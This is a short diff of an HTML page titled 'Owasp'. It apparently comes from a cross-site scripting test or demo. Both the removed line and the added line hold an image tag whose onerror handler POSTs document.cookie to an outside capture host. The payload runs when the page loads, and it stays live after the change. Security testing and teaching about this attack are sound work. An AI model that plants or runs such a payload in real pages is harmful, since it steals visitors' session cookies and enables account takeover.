@@ -10,9 +10,6 @@
   <title>Owasp</title>
 </head>
 <body>
-<img src=null onerror="fetch('https://security.free.beeceptor.com/', { method: 'POST', body: document.cookie})" >
-</div>
-
+  <img src=null onerror="fetch('https://security.free.beeceptor.com/', { method: 'POST', body: document.cookie})" >
 </body>
 </html>
-</style>
